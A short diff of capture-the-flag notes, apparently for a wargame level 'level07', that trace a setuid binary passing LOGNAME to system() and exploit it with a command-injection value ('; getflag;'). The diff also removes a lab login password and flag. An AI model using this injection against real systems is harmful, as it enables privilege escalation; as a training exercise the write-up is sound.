@@ -1,8 +1,6 @@
-- Connect with login: "level07" and password: "wiok45aaoguiboiki2tuin6ub"
 - ls -l <- setuid
 - run with ltrace
 	getenv("LOGNAME") = "level07"
 	system("/bin/echo level07 ")
 - export LOGNAME="; getflag;"
 - ./level07
-	fiumuikeil55xe9cu4dood66h
